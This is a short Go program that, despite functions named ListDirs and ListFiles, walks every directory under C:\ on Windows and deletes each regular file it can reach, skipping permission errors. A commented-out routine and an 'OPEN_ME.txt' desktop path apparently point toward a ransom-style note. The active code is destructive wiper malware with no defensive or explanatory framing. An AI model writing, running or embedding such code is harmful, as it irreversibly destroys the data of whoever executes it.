package main

import (
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

//"os"
// "github.com/go-vgo/robotgo"

func ListDirs(dirName string, location string) {

	entries, err := os.ReadDir(dirName)
	if err != nil {
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			subDir := filepath.Join(dirName, entry.Name())
			ListFiles(subDir)
			ListDirs(subDir, location)
		}
	}

}

func ListFiles(dirPath string) {
	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return
	}

	for _, entry := range entries {
		if entry.Type().IsRegular() {
			err := os.Remove(filepath.Join(dirPath, entry.Name()))
			if err != nil {
				if os.IsPermission(err) {
					continue
				}
			}
		}
	}
}

/* func WriteFile(name string, location string) {
	file, err := os.OpenFile(location, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}

	defer file.Close()
	_, err = file.WriteString(name + "\n")
	if err != nil {
		panic(err)
	}
}
*/

func getSimpleUserName(fullName string) string {
	parts := strings.Split(fullName, `\`)
	return parts[len(parts)-1]
}

func main() {

	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		panic(err)
	}

	username := getSimpleUserName(currentUser.Username)
	var location string = filepath.Join(`C:\Users\`, username, `Desktop\OPEN_ME.txt`)
	var root string = `C:\`
	ListDirs(root, location)
}
